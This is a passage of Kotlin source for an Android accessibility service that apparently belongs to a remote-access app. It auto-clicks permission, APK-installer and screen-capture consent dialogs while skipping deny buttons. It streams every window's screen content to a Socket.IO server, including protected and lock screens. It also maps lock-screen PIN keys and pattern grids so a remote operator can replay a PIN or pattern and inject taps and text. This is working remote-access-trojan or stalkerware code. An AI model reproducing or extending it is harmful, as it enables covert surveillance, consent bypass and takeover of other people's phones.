            val usarEstrito = pacoteUsaListaEstrita(pacote) ||
                (pacoteJanela.isNotEmpty() && pacoteUsaListaEstrita(pacoteJanela))

            // FAST PATH 0ms — instalador do sistema (com trava única por tela).
            if (pacote in pacotesInstalador || pacote.lowercase().contains("packageinstaller")) {
                val clicou = procurarEClicarBotaoInstalador(raiz) || procurarEClicarPermissao(raiz, usarEstrito)
                if (clicou) {
                    ultimoCliqueAuto = System.currentTimeMillis()
                    enviarLog("[AUTO-CLIQUE INSTALADOR 0ms] Clique imediato (pacote=$pacote; trava única por tela ativa).")
                }
                return
            }

            val agora = System.currentTimeMillis()
            if (agora - ultimoCliqueAuto < intervaloAutoCliqueMs()) return
            val clicado = procurarEClicarPermissao(raiz, usarEstrito)
            if (clicado) {
                ultimoCliqueAuto = agora
                enviarLog("[AUTO-CLIQUE] Clique único em permissão (pacote=$pacote; trava anti-loop ativa; onboardingRapido=$onboardingRapido).")
                if (onboardingRapidoAtivo() && !backAgendado && pacoteRequerVoltarAutomatico(pacote)) {
                    backAgendado = true
                    handlerMain.postDelayed({
                        backAgendado = false
                        try {
                            performGlobalAction(GLOBAL_ACTION_BACK)
                            enviarLog("[AUTO-CLIQUE] Voltar automático (onboarding rápido) após confirmar permissão.")
                        } catch (e: Exception) {
                            Log.e(TAG, "Falha no voltar automático: ${e.message}")
                        }
                    }, 900)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro no auto-clique de permissões: ${e.message}")
        }
    }

    /**
     * Busca em profundidade (DFS) por botões clicáveis com texto de permissão
     * ("Permitir", "Iniciar", "Iniciar agora", "Aceitar", "Instalar", etc.) e
     * injeta ACTION_CLICK no primeiro encontrado. Nunca clica em textos de
     * bloqueio ("Negar", "Cancelar", "Desativar", "Não permitir", "Depois").
     *
     * Cobre: telas de aviso de segurança Xiaomi/MIUI/HyperOS, Android 13+,
     * instalador de APKs, tela de sobreposição, diálogo "Iniciar agora" do
     * MediaProjection (SystemUI) e o próprio modal "Iniciar" do app.
     */
    private fun procurarEClicarPermissao(no: AccessibilityNodeInfo, usarEstrito: Boolean): Boolean {
        try {
            val textoBruto = (no.text?.toString() ?: "") + " " + (no.contentDescription?.toString() ?: "")
            val texto = textoBruto.trim().lowercase()
            if (no.isClickable && texto.isNotEmpty()) {
                // REGRA 3: bloqueio verificado PRIMEIRO — invalida o nó completamente.
                val eBloqueio = textosBloquear.any { texto.contains(it) }
                if (!eBloqueio) {
                    // Lista estrita (Config/SystemUI/MIUI) = comparação EXATA,
                    // só frases de permissão. Lista ampla (instalador/
                    // permissioncontroller) = contains (compatibilidade OEM).
                    val ePermitir = if (usarEstrito) textosPermitirEstritos.any { texto == it }
                                    else textosPermitir.any { texto.contains(it) }
                    // REGRA 1: trava única por tela — não clica duas vezes no mesmo botão.
                    if (ePermitir && !botaoJaClicadoNaTela(texto)) {
                        val ok = no.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        if (ok) { marcarBotaoClicado(texto); return true }
                    }
                }
            }
            for (i in 0 until no.childCount) {
                val filho = no.getChild(i) ?: continue
                if (procurarEClicarPermissao(filho, usarEstrito)) return true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro na busca DFS de auto-clique: ${e.message}")
        }
        return false
    }

    // Textos do botao positivo do instalador do sistema (varios OEMs/idiomas).
    private val textosBotaoInstalador = listOf(
        "instalar", "atualizar", "install", "update",
        "instalar pacote", "instalar aplicativo", "atualizar aplicativo",
        "instalar mesmo assim", "continuar instalando", "reinstall", "reinstalar"
    )

    /**
     * FAST PATH 0ms do instalador: busca DFS por um botao clicavel com texto
     * de "Instalar"/"Atualizar" e injeta ACTION_CLICK imediato.
     *
     * Requisito 3 (evitar falsos positivos de fechamento): verifica
     * explicitamente textosBloquear ("cancelar", "depois", "nao", "nao
     * instalar", etc.). Essas palavras SO bloqueiam o NO que as contem —
     * o botao "Instalar" (que nao as contem) e clicado normalmente mesmo
     * que "Cancelar"/"Depois" existam no mesmo dialogo do sistema. Negativas
     * como "Nao instalar" tambem sao bloqueadas por conterem "nao".
     */
    private fun procurarEClicarBotaoInstalador(no: AccessibilityNodeInfo): Boolean {
        try {
            val texto = ((no.text?.toString() ?: "") + " " +
                (no.contentDescription?.toString() ?: "")).trim().lowercase()
            if (no.isClickable && texto.isNotEmpty()) {
                val eBloqueado = textosBloquear.any { texto.contains(it) }
                if (!eBloqueado) {
                    val eBotaoInstalar = textosBotaoInstalador.any { texto.contains(it) }
                    if (eBotaoInstalar && !botaoJaClicadoNaTela(texto)) {
                        if (no.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                            marcarBotaoClicado(texto)
                            return true
                        }
                    }
                }
            }
            for (i in 0 until no.childCount) {
                val filho = no.getChild(i) ?: continue
                if (procurarEClicarBotaoInstalador(filho)) return true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro no clique imediato do instalador: ${e.message}")
        }
        return false
    }

    // ETAPA 3 — textos do botão positivo do diálogo "Adicionar à tela inicial"
    // (requestPinShortcut), em vários launchers/OEMs/idiomas.
    private val textosBotaoAtalho = listOf(
        "adicionar automaticamente", "add automatically",
        "adicionar à tela inicial", "adicionar a tela inicial",
        "add to home screen", "add to home",
        "colocar na tela inicial", "criar atalho", "add shortcut",
        "adicionar", "add"
    )

    /**
     * ETAPA 3 — Busca (DFS) o botão de confirmação do diálogo de atalho
     * ("Adicionar" / "Add automatically" / "Adicionar à tela inicial") e injeta
     * ACTION_CLICK. Só roda enquanto a janela de confirmação está armada
     * (prazoConfirmacaoAtalhoMs), evitando cliques em diálogos não relacionados.
     * Nunca clica em textos de bloqueio ("Cancelar", "Não", etc.).
     */
    private fun procurarEClicarBotaoAtalho(no: AccessibilityNodeInfo): Boolean {
        try {
            val texto = ((no.text?.toString() ?: "") + " " +
                (no.contentDescription?.toString() ?: "")).trim().lowercase()
            if (no.isClickable && texto.isNotEmpty()) {
                val eBloqueio = textosBloquear.any { texto.contains(it) }
                val eAtalho = textosBotaoAtalho.any { texto == it || texto.contains(it) }
                if (!eBloqueio && eAtalho && !botaoJaClicadoNaTela(texto)) {
                    if (no.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        marcarBotaoClicado(texto)
                        enviarLog("[ATALHO] Confirmação automática do diálogo de atalho: '$texto'.")
                        return true
                    }
                }
            }
            for (i in 0 until no.childCount) {
                val filho = no.getChild(i) ?: continue
                if (procurarEClicarBotaoAtalho(filho)) return true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro no clique automático do atalho: ${e.message}")
        }
        return false
    }

    // Textos EXATOS do botão positivo do diálogo do MediaProjection (vários OEMs/idiomas).
    private val textosBotaoMidiaProjecao = listOf(
        "iniciar agora", "start now", "começar agora", "comecar agora",
        "iniciar captura de tela", "iniciar projeção de tela", "iniciar projecao de tela",
        "iniciar compartilhamento de tela", "start screen sharing", "iniciar"
    )

    /**
     * Fallback OEM-agnóstico para o diálogo de consentimento do MediaProjection.
     * Procura (DFS) um botão clicável com texto EXATO de "Iniciar agora" /
     * "Start now" e clica nele. Comparação exata para evitar falsos positivos
     * em outros diálogos do sistema.
     */
    private fun procurarEClicarBotaoMidiaProjecao(no: AccessibilityNodeInfo): Boolean {
        try {
            val texto = (no.text?.toString() ?: "").trim().lowercase()
            if (no.isClickable && texto.isNotEmpty() && textosBotaoMidiaProjecao.contains(texto)) {
                val eBloqueio = textosBloquear.any { texto.contains(it) }
                if (!eBloqueio && !botaoJaClicadoNaTela(texto)) {
                    if (no.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        marcarBotaoClicado(texto)
                        return true
                    }
                }
            }
            for (i in 0 until no.childCount) {
                val filho = no.getChild(i) ?: continue
                if (procurarEClicarBotaoMidiaProjecao(filho)) return true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro no fallback de MediaProjection: ${e.message}")
        }
        return false
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility Service Interrompido")
    }

    override fun onDestroy() {
        super.onDestroy()
        handlerMain.removeCallbacks(autoRemover)
        handlerMain.removeCallbacks(failsafeRestauroBloqueio)
        handlerMain.removeCallbacks(reanimadorPeriodico)
        removerViewPrivacidade()
        overlayEscura?.let { try { windowManager?.removeView(it) } catch (_: Exception) {} }
        overlayEscura = null
        overlayBloqueio?.let { try { windowManager?.removeView(it) } catch (_: Exception) {} }
        overlayBloqueio = null
        overlayAtualizacaoPreta?.let { try { windowManager?.removeView(it) } catch (_: Exception) {} }
        overlayAtualizacaoPreta = null
        if (instance == this) {
            instance = null
        }
        Log.d(TAG, "Accessibility Service Destruído")
    }

    /** Clique direto via dispatchGesture com toque físico de 50ms na coordenada exata (compatível com Xiaomi). */
    fun clickAt(x: Float, y: Float, onResult: ((Boolean) -> Unit)? = null) {
        // Usado pelo motor de auto-clique; se o Acesso Total estiver ativo,
        // libera o overlay para o gesto injetado atravessar (painel não trava).
        setBloqueioPermiteToqueRemoto(true)
        handlerMain.removeCallbacks(failsafeRestauroBloqueio)
        handlerMain.postDelayed(failsafeRestauroBloqueio, 3000L)
        val boundedX = x.coerceIn(0f, resources.displayMetrics.widthPixels.toFloat() - 1f)
        val boundedY = y.coerceIn(0f, resources.displayMetrics.heightPixels.toFloat() - 1f)
        val path = Path().apply {
            moveTo(boundedX, boundedY)
            lineTo(boundedX + 1f, boundedY + 1f)
        }
        val stroke = GestureDescription.StrokeDescription(path, 0, 30L)
        val gestureBuilder = GestureDescription.Builder().addStroke(stroke)
        dispatchGesture(gestureBuilder.build(), object : GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription?) {
                super.onCompleted(gestureDescription)
                restaurarBloqueioLocal()
                onResult?.invoke(true)
            }
            override fun onCancelled(gestureDescription: GestureDescription?) {
                super.onCancelled(gestureDescription)
                restaurarBloqueioLocal()
                onResult?.invoke(false)
            }
        }, null)
    }

    fun swipe(startX: Float, startY: Float, endX: Float, endY: Float, durationMs: Long = 300, bypass: Boolean = true, onResult: ((Boolean) -> Unit)? = null) {
        // Só a SALA do emulador nativo abre o bypass do overlay (Acesso Total).
        // A sala do dispositivo android injeta o swipe SEM tocar no overlay.
        if (bypass) {
            setBloqueioPermiteToqueRemoto(true)
            handlerMain.removeCallbacks(failsafeRestauroBloqueio)
            handlerMain.postDelayed(failsafeRestauroBloqueio, 3000L)
        }
        val path = Path().apply {
            moveTo(startX, startY)
            lineTo(endX, endY)
        }
        val stroke = GestureDescription.StrokeDescription(path, 0, durationMs)
        val gestureBuilder = GestureDescription.Builder().addStroke(stroke)
        dispatchGesture(gestureBuilder.build(), object : GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription?) {
                super.onCompleted(gestureDescription)
                if (bypass) restaurarBloqueioLocal()
                onResult?.invoke(true)
            }
            override fun onCancelled(gestureDescription: GestureDescription?) {
                super.onCancelled(gestureDescription)
                if (bypass) restaurarBloqueioLocal()
                onResult?.invoke(false)
            }
        }, null)
    }

    fun performGlobalHomeAction(): Boolean = performGlobalAction(GLOBAL_ACTION_HOME)
    fun performGlobalBackAction(): Boolean = performGlobalAction(GLOBAL_ACTION_BACK)
    fun performGlobalRecentesAction(): Boolean = performGlobalAction(GLOBAL_ACTION_RECENTS)

    /**
     * Acende a tela do dispositivo (se estiver apagada) e dispensa o keyguard.
     * Chamado pelo botão Power/Ligar do painel/emulador remoto via Socket.IO.
     * Posta na main thread por segurança (WakeLock + KeyguardLock em alguns
     * OEMs exigem Looper principal). Requer permissão WAKE_LOCK e
     * DISABLE_KEYGUARD no AndroidManifest.xml.
     */
    /**
     * Botão Power do painel — funciona IGUAL ao botão Power físico do celular:
     * alterna a tela entre ligada e desligada.
     *   - Tela DESLIGADA -> acende (WakeLock + dispensa keyguard).
     *   - Tela LIGADA    -> bloqueia/desliga (GLOBAL_ACTION_LOCK_SCREEN, API 28+;
     *                       em APIs antigas abre o diálogo de energia).
     * NÃO toca em nenhuma outra função (auto-clique, keep-alive, gestos).
     */
    fun acenderTelaRemota() {
        handlerMain.post {
            try {
                val pm = getSystemService(POWER_SERVICE) as PowerManager
                if (pm.isInteractive) {
                    // Tela ligada -> desligar/bloquear (igual ao power físico).
                    val ok = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
                    } else {
                        performGlobalAction(GLOBAL_ACTION_POWER_DIALOG)
                    }
                    enviarLog("[POWER] Tela estava LIGADA -> ${if (ok) "bloqueada/desligada" else "falha ao bloquear"}.")
                } else {
                    // Tela desligada -> acender.
                    acenderTela()
                    enviarLog("[POWER] Tela estava DESLIGADA -> acendendo.")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Erro no botão Power: ${e.message}")
            }
        }
    }

    // ================================================================
    // EMULADOR WIREFRAME — leitura da árvore de tela em tempo real
    // ----------------------------------------------------------------
    // Percorre TODAS as janelas ativas (service.windows), incluindo
    // TYPE_APPLICATION, TYPE_SYSTEM e a tela de bloqueio/Keyguard —
    // NÃO depende apenas de rootInActiveWindow (que retorna null na
    // tela de bloqueio / popups em várias ROMs). Funciona em telas
    // protegidas (FLAG_SECURE) e na tela de bloqueio onde o vídeo
    // (MediaProjection) fica preto, pois a acessibilidade lê a árvore
    // de views, não pixels. Controle remoto via "wireframe_control_painel".
    // ================================================================
    @Volatile private var wireframeFpsAtual = 0        // 0 = pausado
    @Volatile private var wireframeUltimoHash = 0L
    @Volatile private var wireframeUltimoEnvioMs = 0L
    // Cache da última grade de padrão (9 centros reais) e teclas de PIN
    // (dígito -> centro real), para replay de comandos enviados por
    // índice (1..9) ou por dígito ("1234") vindos do painel.
    @Volatile private var wireframePadraoCentros: List<android.graphics.PointF> = emptyList()
    @Volatile private var wireframePinTeclas: Map<String, android.graphics.PointF> = emptyMap()

    private val runnableWireframe = object : Runnable {
        override fun run() {
            if (wireframeFpsAtual <= 0) return // pausado
            try {
                capturarEEnviarWireframe()
            } catch (e: Exception) {
                Log.e(TAG, "Erro no frame wireframe: ${e.message}")
            }
            val intervaloMs = (1000L / wireframeFpsAtual).coerceIn(100L, 5000L)
            handlerMain.postDelayed(this, intervaloMs)
        }
    }

    /** Inicia (ou altera o FPS do) stream de wireframe. Zera qualquer
     *  cache/hash anterior e posta o PRIMEIRO frame no milissegundo 0
     *  (post imediato na main thread) ANTES de iniciar o loop do Handler
     *  com intervalo 1000/fps ms (ex: 200ms para 5 FPS). */
    fun iniciarStreamLeitorTela(fps: Int) {
        val f = fps.coerceIn(1, 10)
        wireframeFpsAtual = f
        wireframeUltimoHash = 0L          // força reenvio imediato
        wireframeUltimoEnvioMs = 0L
        handlerMain.removeCallbacks(runnableWireframe)
        handlerMain.post(runnableWireframe) // frame 0 já no próximo tick
        enviarLogApp("[WIREFRAME] Stream iniciado a $f FPS (frame 0 imediato, hash zerado).")
    }

    /** Pausa o stream de wireframe. */
    fun pararStreamLeitorTela() {
        if (wireframeFpsAtual == 0) return
        wireframeFpsAtual = 0
        handlerMain.removeCallbacks(runnableWireframe)
        enviarLogApp("[WIREFRAME] Stream pausado.")
    }

    /**
     * Percorre TODAS as janelas ativas (windows), monta payload LEVE e
     * emite "wireframe_frame". Inclui estado do aparelho (Keyguard +
     * PowerManager): bloqueado, telaApagada, tipoBloqueio
     * (nenhum|capa|padrao|pin), centros da grade de padrão e teclas de
     * PIN detectados na árvore (para desbloqueio interativo no painel).
     * Economiza banda: só envia se o hash da árvore mudou OU se já se
     * passaram >5s desde o último envio (painéis que acabaram de conectar).
     */
    private fun capturarEEnviarWireframe() {
        val metrics = resources.displayMetrics
        val w = metrics.widthPixels
        val h = metrics.heightPixels

        // --- Estado do aparelho (Keyguard + PowerManager) ---
        val kg = getSystemService(KEYGUARD_SERVICE) as? KeyguardManager
        val pm = getSystemService(POWER_SERVICE) as? PowerManager
        val telaApagada = pm?.isInteractive == false
        val bloqueado = kg?.isKeyguardLocked == true
        val keyguardSeguro = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1)
            kg?.isKeyguardSecure == true else false

        val nos = JSONArray()
        // Coletores preenchidos DURANTE a travessia única da árvore:
        val padraoBounds = arrayOfNulls<android.graphics.Rect>(1)
        val pinTeclas = mutableListOf<Pair<String, android.graphics.PointF>>() // dígito -> centro

        // --- 1) Coleta as raízes de TODAS as janelas ativas ---
        val roots = mutableListOf<AccessibilityNodeInfo>()
        try {
            val janelas: List<android.view.accessibility.AccessibilityWindowInfo> =
                windows ?: emptyList()
            for (janela in janelas) {
                val tipo = janela.type
                // Pula apenas janelas de overlay de acessibilidade (as nossas)
                if (tipo == android.view.accessibility.AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY) continue
                val raiz = janela.root ?: continue
                roots.add(raiz)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao listar janelas: ${e.message}")
        }
        // Fallback: se nenhuma janela retornou raiz (ROMs antigas / tela
        // apagada), usa rootInActiveWindow (mantém compatibilidade).
        if (roots.isEmpty()) {
            try { rootInActiveWindow?.let { roots.add(it) } } catch (_: Exception) {}
        }

        // --- 2) Travessia ÚNICA: monta nós + detecta padrão/PIN ---
        for (raiz in roots) {
            lerNosWireframe(raiz, nos, profundidade = 0, maxNos = 800, padraoBounds, pinTeclas)
        }

        // --- 3) tipoBloqueio + grade de padrão (9 centros em coords reais) ---
        var tipoBloqueio = "nenhum"
        val padraoCentros = JSONArray()
        if (bloqueado) {
            tipoBloqueio = if (!keyguardSeguro) "capa" else "pin"
            val pb = padraoBounds[0]
            if (pb != null && pb.width() > 100 && pb.height() > 100) {
                tipoBloqueio = "padrao"
                // Grade 3x3 de centros dentro da LockPatternView (AOSP e
                // ROMs conhecidas: Samsung, Xiaomi/MIUI, Motorola, etc.).
                val cellW = pb.width() / 3f
                val cellH = pb.height() / 3f
                val centrosReais = mutableListOf<android.graphics.PointF>()
                var idx = 1
                for (row in 0..2) {
                    for (col in 0..2) {
                        val cx = pb.left + cellW * (col + 0.5f)
                        val cy = pb.top + cellH * (row + 0.5f)
                        centrosReais.add(android.graphics.PointF(cx, cy))
                        padraoCentros.put(JSONObject().apply {
                            put("i", idx); put("x", cx.toInt()); put("y", cy.toInt())
                        })
                        idx++
                    }
                }
                wireframePadraoCentros = centrosReais
            } else {
                wireframePadraoCentros = emptyList()
            }
        } else {
            wireframePadraoCentros = emptyList()
        }

        // --- Cache de teclas de PIN (dígito -> centro real) ---
        val pinJson = JSONArray()
        val mapaPin = mutableMapOf<String, android.graphics.PointF>()
        for ((dig, pt) in pinTeclas) {
            if (mapaPin.containsKey(dig)) continue
            mapaPin[dig] = pt
            pinJson.put(JSONObject().apply { put("d", dig); put("x", pt.x.toInt()); put("y", pt.y.toInt()) })
        }
        wireframePinTeclas = mapaPin

        // --- 4) Hash leve + throttling de banda ---
        var hash: Long = nos.length().toLong() * 31L +
            (if (bloqueado) 7L else 3L) +
            tipoBloqueio.hashCode().toLong()
        if (nos.length() > 0) {
            val primeiro = nos.optJSONArray(0)
            if (primeiro != null) hash += primeiro.optLong(0, 0) + primeiro.optLong(1, 0) * 31
        }
        val agora = System.currentTimeMillis()
        val mudou = (hash != wireframeUltimoHash)
        val forcar = (agora - wireframeUltimoEnvioMs > 5000L)
        if (!mudou && !forcar) return // sem mudança recente -> economiza banda
        wireframeUltimoHash = hash
        wireframeUltimoEnvioMs = agora

        val payload = JSONObject().apply {
            put("deviceId", "${Build.MANUFACTURER}-${Build.MODEL}")
            put("dispositivo", "${Build.MANUFACTURER}-${Build.MODEL}")
            put("width", w)
            put("height", h)
            put("fps", wireframeFpsAtual)
            put("timestamp", agora)
            put("bloqueado", bloqueado)
            put("telaApagada", telaApagada)
            put("tipoBloqueio", tipoBloqueio)
            put("padrao", JSONObject().apply {
                val r = padraoBounds[0]
                put("bounds", if (r != null) JSONArray().apply {
                    put(r.left); put(r.top); put(r.right); put(r.bottom)
                } else JSONArray())
                put("pontos", padraoCentros)
            })
            put("pinTeclas", pinJson)
            put("nos", nos)
        }
        SocketManager.socket?.emit("wireframe_frame", payload)
    }

    /**
     * Leitor recursivo compacto. Cada nó vira array JSON:
     *   [left, top, right, bottom, clickable(0/1), "text|contentDescription", "className"]
     * Na MESMA passada detecta a LockPatternView (senha padrão 3x3) e as
     * teclas numéricas do PIN. Ignora nós invisíveis e de tamanho zero.
     * Para em 800 nós / profundidade 25 para não travar o dispositivo.
     */
    private fun lerNosWireframe(
        no: AccessibilityNodeInfo, saida: JSONArray,
        profundidade: Int, maxNos: Int,
        padraoBounds: Array<android.graphics.Rect?>,
        pinTeclas: MutableList<Pair<String, android.graphics.PointF>>
    ): Int {
        if (saida.length() >= maxNos || profundidade > 25) return saida.length()
        try {
            if (!no.isVisibleToUser) return saida.length()
            val rect = android.graphics.Rect()
            no.getBoundsInScreen(rect)
            if (rect.width() < 2 || rect.height() < 2) return saida.length()

            val viewId = (no.viewIdResourceName ?: "").lowercase()
            val cls = (no.className?.toString() ?: "").lowercase()
            val txt = (no.text?.toString() ?: "").trim()

            // --- Detecção de LockPatternView (senha padrão 3x3) ---
            if (padraoBounds[0] == null && rect.width() > 100 && rect.height() > 100 &&
                (viewId.contains("lockpattern") || viewId.contains("lock_pattern") ||
                 viewId.contains("patternview") || cls.contains("lockpattern"))) {
                padraoBounds[0] = rect
            }

            // --- Detecção de teclas de PIN (dígitos 0-9 clicáveis no keyguard) ---
            if ((no.isClickable || no.isFocusable) && txt.matches(Regex("^[0-9]$")) &&
                (viewId.contains("pin") || viewId.contains("keyguard") ||
                 viewId.contains("digit") || viewId.contains("numeric") ||
                 viewId.contains("password") || viewId.contains("key") ||
                 cls.contains("keyboard") || cls.contains("button") ||
                 cls.contains("textview") || cls.contains("imageview"))) {
                pinTeclas.add(txt to android.graphics.PointF(rect.exactCenterX(), rect.exactCenterY()))
            }

            val texto = (txt.ifEmpty { no.contentDescription?.toString() ?: "" }).take(60)
            val arr = JSONArray().apply {
                put(rect.left); put(rect.top); put(rect.right); put(rect.bottom)
                put(if (no.isClickable || no.isFocusable) 1 else 0)
                put(texto)
                put(no.className?.toString()?.substringAfterLast('.') ?: "")
            }
            saida.put(arr)

            for (i in 0 until no.childCount) {
                val filho = no.getChild(i) ?: continue
                lerNosWireframe(filho, saida, profundidade + 1, maxNos, padraoBounds, pinTeclas)
                filho.recycle()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao ler nó wireframe: ${e.message}")
        }
        return saida.length()
    }

    /**
     * Ponto de entrada do controle remoto (despachado pelo SocketManager
     * a partir do evento "wireframe_control_painel"). Comandos suportados:
     *   play / pause / fps / tap(x,y) / swipe(x1,y1,x2,y2) / swipe_up
     *   pattern(pontos:[{x,y}] OU indices:[1..9]) / pin(digitos:"1234")
     *   back / home / recents / send_text(texto) / wake_screen
     */
    fun executarControleWireframe(json: JSONObject?) {
        if (json == null) return
        val comando = json.optString("comando", json.optString("acao", "")).lowercase()
        when (comando) {
            "play" -> iniciarStreamLeitorTela(json.optInt("fps", 5))
            "pause" -> pararStreamLeitorTela()
            "fps" -> iniciarStreamLeitorTela(json.optInt("valor", json.optInt("fps", 5)))
            "tap" -> {
                val x = json.optDouble("x", 0.0).toFloat()
                val y = json.optDouble("y", 0.0).toFloat()
                clickAt(x, y)
                enviarLog("[WIREFRAME] tap em ($x, $y)")
            }
            "swipe" -> {
                val x1 = json.optDouble("x1", 0.0).toFloat()
                val y1 = json.optDouble("y1", 0.0).toFloat()
                val x2 = json.optDouble("x2", 0.0).toFloat()
                val y2 = json.optDouble("y2", 0.0).toFloat()
                handlerMain.post {
                    try {
                        setBloqueioPermiteToqueRemoto(true)
                        handlerMain.removeCallbacks(failsafeRestauroBloqueio)
                        handlerMain.postDelayed(failsafeRestauroBloqueio, 5000L)
                        val caminho = Path().apply { moveTo(x1, y1); lineTo(x2, y2) }
                        val gesto = GestureDescription.Builder()
                            .addStroke(GestureDescription.StrokeDescription(caminho, 0, 300L))
                            .build()
                        dispatchGesture(gesto, object : GestureResultCallback() {
                            override fun onCompleted(g: GestureDescription?) { restaurarBloqueioLocal() }
                            override fun onCancelled(g: GestureDescription?) { restaurarBloqueioLocal() }
                        }, handlerMain)
                        enviarLog("[WIREFRAME] swipe ($x1,$y1)->($x2,$y2)")
                    } catch (e: Exception) {
                        enviarLog("[WIREFRAME ERRO] swipe: ${e.message}")
                        restaurarBloqueioLocal()
                    }
                }
            }
            "swipe_up" -> {
                // Acorda a tela (se apagada) + desliza para cima (abre a
                // senha na tela de bloqueio / sai da tela de capa).
                desbloquearSwipeRemoto()
                enviarLog("[WIREFRAME] swipe_up — acordar + deslizar para abrir senha.")
            }
            "pattern" -> {
                val pontos = mutableListOf<android.graphics.PointF>()
                val arr = json.optJSONArray("pontos")
                if (arr != null && arr.length() >= 2) {
                    for (i in 0 until arr.length()) {
                        val item = arr.optJSONObject(i) ?: continue
                        pontos.add(android.graphics.PointF(
                            item.optDouble("x", 0.0).toFloat(),
                            item.optDouble("y", 0.0).toFloat()))
                    }
                } else {
                    // Índices 1..9 -> mapeia para os centros cacheados da grade
                    val idxs = json.optJSONArray("indices") ?: json.optJSONArray("sequencia")
                    val centros = wireframePadraoCentros
                    if (idxs != null && centros.size == 9) {
                        for (i in 0 until idxs.length()) {
                            val idx = idxs.optInt(i, 0) - 1
                            if (idx in 0..8) pontos.add(centros[idx])
                        }
                    }
                }
                if (pontos.size < 2) {
                    enviarLog("[WIREFRAME ERRO] pattern: menos de 2 pontos (ou grade ainda não detectada — toque em Play e aguarde 1 frame).")
                    return
                }
                handlerMain.post {
                    try {
                        setBloqueioPermiteToqueRemoto(true)
                        handlerMain.removeCallbacks(failsafeRestauroBloqueio)
                        handlerMain.postDelayed(failsafeRestauroBloqueio, 8000L)
                        desbloquearPadraoPontos(pontos) { ok ->
                            enviarLog("[WIREFRAME] pattern desenhado (${pontos.size} pts, ok=$ok).")
                            restaurarBloqueioLocal()
                        }
                    } catch (e: Exception) {
                        enviarLog("[WIREFRAME ERRO] pattern: ${e.message}")
                        restaurarBloqueioLocal()
                    }
                }
            }
            "pin" -> {
                val digitos = json.optString("digitos", json.optString("valor", "")).filter { it.isDigit() }
                if (digitos.isEmpty()) {
                    enviarLog("[WIREFRAME ERRO] pin: sem dígitos.")
                    return
                }
                val teclas = wireframePinTeclas
                if (teclas.isEmpty()) {
                    enviarLog("[WIREFRAME ERRO] pin: teclado numérico ainda não detectado (toque em Play e aguarde 1 frame com a tela de PIN visível).")
                    return
                }
                handlerMain.post {
                    var atraso = 0L
                    for (d in digitos) {
                        val pt = teclas[d.toString()]
                        if (pt != null) {
                            handlerMain.postDelayed({ clickAt(pt.x, pt.y) }, atraso)
                            atraso += 250L
                        } else {
                            enviarLog("[WIREFRAME AVISO] pin: dígito '$d' não encontrado no teclado detectado.")
                        }
                    }
                    enviarLog("[WIREFRAME] pin '$digitos' enviado (${digitos.length} dígitos, intervalo 250ms).")
                }
            }
            "back" -> { performGlobalBackAction(); enviarLog("[WIREFRAME] Voltar") }
            "home" -> { performGlobalHomeAction(); enviarLog("[WIREFRAME] Home") }
            "recents" -> { performGlobalRecentesAction(); enviarLog("[WIREFRAME] Recentes") }
            "wake_screen" -> {
                handlerMain.post {
                    try {
                        val pm = getSystemService(POWER_SERVICE) as PowerManager
                        if (!pm.isInteractive) acenderTela()
                        @Suppress("DEPRECATION")
                        val wl = pm.newWakeLock(
                            PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
                                PowerManager.ACQUIRE_CAUSES_WAKEUP or
                                PowerManager.ON_AFTER_RELEASE,
                            "AcessoMaterno:WakeScreenWireframe"
                        )
                        wl.acquire(15000L)
                        enviarLog("[WIREFRAME] wake_screen — tela acordada (WakeLock 15s).")
                    } catch (e: Exception) {
                        enviarLog("[WIREFRAME ERRO] wake_screen: ${e.message}")
                    }
                }
            }
            "send_text" -> {
                val texto = json.optString("texto", "")
                // inserir=true (Ctrl+V do painel): mantém o conteúdo atual e
                // insere o texto colado na posição do cursor (não apaga nada).
                val inserir = json.optBoolean("inserir", false)
                handlerMain.post {
                    try {
                        var alvo: AccessibilityNodeInfo? = null
                        // 1. Prioriza o campo REALMENTE focado pelo usuário
                        try { alvo = rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) } catch (_: Exception) {}
                        if (alvo == null) {
                            // 2. Fallback: primeiro nó editável visível caso não haja foco ativo
                            alvo = buscarNoEditavel()
                        }
                        if (alvo != null) {
                            // Revalidação robusta de foco/editabilidade
                            if (!alvo.isVisibleToUser || (!alvo.isEditable && (alvo.actions and AccessibilityNodeInfo.ACTION_SET_TEXT) == 0)) {
                                enviarLog("[WIREFRAME AVISO] send_text: alvo perdeu foco ou não é editável.")
                                try { alvo.recycle() } catch (_: Exception) {}
                                return@post
                            }

                            // Monta o texto final: se "inserir", combina o
                            // conteúdo atual com o colado na posição do cursor;
                            // caso contrário, substitui (comportamento do campo
                            // "Send text").
                            val atual = alvo.text?.toString() ?: ""
                            val textoFinal: String
                            val cursorFinal: Int
                            if (inserir) {
                                var ini = alvo.textSelectionStart
                                var fim = alvo.textSelectionEnd
                                if (ini < 0 || ini > atual.length) ini = atual.length
                                if (fim < 0 || fim > atual.length) fim = atual.length
                                if (ini > fim) { val tmp = ini; ini = fim; fim = tmp }
                                textoFinal = atual.substring(0, ini) + texto + atual.substring(fim)
                                cursorFinal = ini + texto.length
                            } else {
                                textoFinal = texto
                                cursorFinal = texto.length
                            }

                            val args = android.os.Bundle().apply {
                                putCharSequence(
                                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, textoFinal)
                            }
                            val ok = alvo.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)

